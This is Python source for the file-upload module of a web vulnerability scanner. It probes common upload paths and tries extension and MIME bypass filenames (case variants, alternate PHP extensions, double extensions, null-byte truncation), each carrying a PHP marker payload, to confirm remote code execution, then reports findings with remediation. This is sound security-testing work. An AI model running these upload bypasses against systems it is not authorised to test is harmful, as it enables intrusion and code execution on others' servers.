"""
FileUploadModule — YATA RECON module.
Analyzes file upload endpoints for missing validation.

NOTE on ctx['forms']: ReconModule._extract_forms stores `inputs` as a plain
{name: value} dict, and deliberately EXCLUDES type="file" inputs from it
entirely (see modules/recon.py). That means file inputs can never be
recovered from crawled form data — this module can't tell which forms are
upload forms from that source at all. We compensate with a name-based
heuristic over whatever inputs *are* present, plus independent probing of
common upload endpoint paths (also covers the very common case of a
JS-driven upload widget with no <form> markup at all).
"""
import random
import re
import time
import urllib.parse

try:
    import requests
except ImportError:
    requests = None

from recon.modules import BaseModule


UPLOAD_NAME_HINTS = ("file", "upload", "attach", "avatar", "photo", "image",
                     "document", "resume", "cv", "media", "picture")

COMMON_UPLOAD_PATHS = [
    "/upload", "/api/upload", "/upload.php", "/api/v1/upload", "/api/v2/upload",
    "/file/upload", "/files/upload", "/media/upload", "/api/files",
    "/api/media", "/avatar/upload", "/profile/upload", "/attachments",
]

REJECTION_SIGNALS = ("invalid file", "not allowed", "unsupported file",
                      "file type", "extension not", "rejected", "forbidden")


# Extension-bypass filenames tried when the plain SVG probe below is
# rejected/not confirmed — each pairs a PHP-executable body with a
# filename/MIME combination designed to slip past a naive allow-list
# (extension-only checks, MIME-only checks, or a check that only looks at
# the FIRST or LAST extension in a multi-dot filename).
def _bypass_filenames(marker):
    return [
        (f"{marker}.php", "image/jpeg", "raw .php + spoofed image MIME"),
        (f"{marker}.PHP", "image/jpeg", "case variation (.PHP)"),
        (f"{marker}.pHp", "image/jpeg", "case variation (.pHp)"),
        (f"{marker}.php5", "image/jpeg", "alternate PHP extension (.php5)"),
        (f"{marker}.phtml", "image/jpeg", "alternate PHP extension (.phtml)"),
        (f"{marker}.phar", "image/jpeg", "alternate PHP extension (.phar)"),
        (f"{marker}.jpg.php", "image/jpeg", "double extension (.jpg.php)"),
        (f"{marker}.php.jpg", "image/jpeg", "double extension (.php.jpg — some configs execute the LAST recognized handler)"),
        (f"{marker}.php%00.jpg", "image/jpeg", "null-byte extension truncation (legacy PHP <5.3.4)"),
        (f"{marker}.php.", "image/jpeg", "trailing dot (Windows strips it server-side on some configs)"),
    ]


class FileUploadModule(BaseModule):
    NAME = "File Upload"

    def run(self):
        self.ui.section("File Upload Security Analysis")
        if not requests:
            return

        upload_endpoints = set()

        for form in self.ctx.get("forms", []):
            inputs = form.get("inputs", {})
            names = inputs.keys() if isinstance(inputs, dict) else inputs
            if any(isinstance(n, str) and any(h in n.lower() for h in UPLOAD_NAME_HINTS) for n in names):
                upload_endpoints.add((form.get("action", self.base_url), form.get("method", "POST").upper()))

        for path in COMMON_UPLOAD_PATHS:
            upload_endpoints.add((urllib.parse.urljoin(self.base_url, path), "POST"))

        s = self._session()
        found = 0

        for url, method in upload_endpoints:
            try:
                if self._test_upload(s, url, method):
                    found += 1
                    continue  # already confirmed unrestricted upload here — extension-bypass would be redundant
                if self._test_extension_bypass(s, url, method):
                    found += 1
            except Exception:
                continue
            time.sleep(self.delay)

        if found == 0:
            self.ui.info("No file upload vulnerabilities detected.")

    def _test_extension_bypass(self, session, url, method) -> bool:
        """
        Goes beyond "does it accept an unvalidated file at all" (the SVG
        test) to "can a PHP-executable file actually be uploaded and run."
        Each bypass filename carries the exact same tiny PHP payload; after
        an accepted upload, we fetch the stored file back and look for the
        marker string appearing WITHOUT its surrounding `<?php ... ?>`
        tags — the same bytes coming back as literal source text (tags
        visible) means the file was stored and served raw/inert, while the
        marker alone with no PHP syntax around it means the server actually
        EXECUTED the file and we're looking at its output. That's a direct,
        high-confidence signal rather than an inference from status codes.
        """
        marker = f"grupload{random.randint(100000, 999999)}"
        php_body = f"<?php echo '{marker}'; ?>".encode()

        for filename, content_type, technique in _bypass_filenames(marker):
            files = {"file": (filename, php_body, content_type)}
            try:
                resp = session.request(method, url, files=files, timeout=self.timeout)
            except Exception:
                continue
            if resp.status_code not in (200, 201):
                continue

            stored_url = (self._extract_stored_url(resp, url, marker)
                           or self._guess_stored_url(session, url, filename))
            if not stored_url:
                continue

            try:
                check = session.get(stored_url, timeout=self.timeout)
            except Exception:
                continue
            if check.status_code != 200 or marker not in check.text:
                continue

            if "<?php" in check.text or "<?=" in check.text:
                # Marker came back, but so did the raw PHP source — stored
                # and served as an inert text file, not executed. Still
                # worth flagging (extension validation was bypassed) but
                # explicitly NOT claimed as RCE.
                self._report(url, stored_url, technique, filename, executed=False)
                return True

            # Marker present, PHP source syntax absent — the file ran.
            self._report(url, stored_url, technique, filename, executed=True)
            return True

        return False

    def _guess_stored_url(self, session, upload_url, filename):
        """Fallback when the upload response doesn't reveal a URL directly
        (e.g. a bare `{"success": true}` ack) — try the handful of
        overwhelmingly common upload-serving path conventions."""
        for pattern in ("/uploads/{f}", "/upload/{f}", "/files/{f}", "/file/{f}",
                        "/media/{f}", "/static/uploads/{f}", "/assets/uploads/{f}",
                        "/user/uploads/{f}", "/storage/{f}", "/data/uploads/{f}"):
            candidate = urllib.parse.urljoin(self.base_url, pattern.format(f=filename))
            try:
                r = session.get(candidate, timeout=self.timeout)
                if r.status_code == 200:
                    return candidate
            except Exception:
                continue
        return None

    def _report(self, upload_url, stored_url, technique, filename, executed):
        if executed:
            self.db.add(
                title="Unrestricted File Upload — Remote Code Execution",
                severity="critical", url=stored_url, module=self.NAME,
                description=(
                    f"A PHP-executable file ('{filename}') was uploaded via {technique} and, when "
                    f"fetched back from {stored_url}, returned our marker string WITHOUT its "
                    "surrounding PHP source syntax — meaning the server actually EXECUTED the "
                    "file rather than serving it as static content. This is confirmed remote "
                    "code execution via file upload."
                ),
                remediation=(
                    "Validate file content (not just extension/MIME), store uploads outside the "
                    "webroot or on a domain with no script execution, and explicitly deny "
                    "execution of uploaded files at the web server config level regardless of "
                    "extension."
                ),
                cvss="9.8", confidence="CONFIRMED", confidence_score=97,
                validation_steps=["file_upload_accepted", "stored_file_retrieved", "marker_returned_without_php_source"],
                evidence=[f"Upload URL: {upload_url}", f"Technique: {technique}", f"Stored at: {stored_url}"],
            )
            self.ui.find("critical", f"File Upload RCE ({technique})", stored_url)
        else:
            self.db.add(
                title="File Upload — Extension/MIME Validation Bypassed",
                severity="high", url=stored_url, module=self.NAME,
                description=(
                    f"A file named '{filename}' ({technique}) was accepted by the upload endpoint "
                    f"and is retrievable at {stored_url}, despite carrying PHP source content. "
                    "Execution wasn't confirmed (the raw source came back rather than evaluated "
                    "output), but the extension/MIME allow-list is clearly bypassable — worth "
                    "manual follow-up against the actual web server config."
                ),
                remediation="Validate file content, not just extension/MIME type. Deny execution of uploaded files at the web server config level.",
                cvss="6.5", confidence="HIGH", confidence_score=75,
                validation_steps=["file_upload_accepted", "stored_file_retrieved", "marker_present_source_visible"],
                evidence=[f"Upload URL: {upload_url}", f"Technique: {technique}", f"Stored at: {stored_url}"],
            )
            self.ui.find("high", f"File Upload validation bypass ({technique})", stored_url)

    def _test_upload(self, session, url, method) -> bool:
        marker = "yata_recon_test"
        svg_content = (
            b'<?xml version="1.0" standalone="no"?>'
            b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
            b'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">'
            b'<text x="10" y="20" font-size="20">test</text></svg>'
        )
        files = {"file": (f"{marker}.svg", svg_content, "image/svg+xml")}

        try:
            resp = session.request(method, url, files=files, timeout=self.timeout)
        except Exception:
            return False

        if resp.status_code not in (200, 201):
            return False

        body_lower = resp.text.lower()
        if any(sig in body_lower for sig in REJECTION_SIGNALS) and marker not in resp.text:
            return False
        if marker not in resp.text and resp.status_code != 201:
            # No echo of our filename and not an explicit "Created" — too
            # weak a signal that anything actually happened server-side.
            return False

        # Try to confirm the file is genuinely stored and retrievable.
        stored_url = self._extract_stored_url(resp, url, marker)
        confirmed = False
        if stored_url:
            try:
                check = session.get(stored_url, timeout=self.timeout)
                if check.status_code == 200 and (marker.encode() in check.content or b"<svg" in check.content):
                    confirmed = True
            except Exception:
                pass

        severity = "high" if confirmed else "medium"
        confidence = "CONFIRMED" if confirmed else "MEDIUM"
        confidence_score = 90 if confirmed else 55

        desc = (
            "The file upload endpoint accepted an SVG file without validating its content. "
            "SVGs can contain embedded JavaScript (Stored XSS) or trigger XXE in vulnerable parsers."
        )
        if confirmed:
            desc += f" The uploaded file was independently confirmed retrievable at: {stored_url}"
        else:
            desc += (
                " The server accepted the upload but a retrievable URL for the stored file could not "
                "be confirmed automatically — verify manually."
            )

        self.db.add(
            title="Unrestricted File Upload" + (" (Confirmed)" if confirmed else " (Potential)"),
            severity=severity, url=stored_url or url, module=self.NAME,
            description=desc,
            remediation="Validate file contents (not just extension/MIME type). Serve uploaded files "
                        "from a separate domain with no script execution, force download for SVG/HTML, "
                        "and sanitize or reject SVG uploads outright.",
            cvss="7.5" if confirmed else "5.4",
            confidence=confidence,
            confidence_score=confidence_score,
            validation_steps=["file_upload_accepted"] + (["stored_file_retrieved"] if confirmed else []),
            evidence=[f"Upload URL: {url}"] + ([f"Stored at: {stored_url}"] if stored_url else []),
        )
        self.ui.find(severity, f"SVG File Upload {'Confirmed' if confirmed else 'Accepted'}", stored_url or url)
        return True

    def _extract_stored_url(self, resp, upload_url, marker):
        try:
            data = resp.json()
            found = self._find_url_in_json(data, marker)
            if found:
                return urllib.parse.urljoin(upload_url, found)
        except Exception:
            pass

        m = re.search(rf'["\'](/[^"\']*{re.escape(marker)}[^"\']*)["\']', resp.text)
        if m:
            return urllib.parse.urljoin(upload_url, m.group(1))
        m = re.search(rf'(https?://[^\s"\']*{re.escape(marker)}[^\s"\']*)', resp.text)
        if m:
            return m.group(1)
        return None

    @classmethod
    def _find_url_in_json(cls, obj, marker):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str) and (marker in v or (k.lower() in ("url", "path", "file_url", "location", "link") and v)):
                    if v.startswith("/") or v.startswith("http"):
                        return v
                found = cls._find_url_in_json(v, marker)
                if found:
                    return found
        elif isinstance(obj, list):
            for item in obj:
                found = cls._find_url_in_json(item, marker)
                if found:
                    return found
        return None
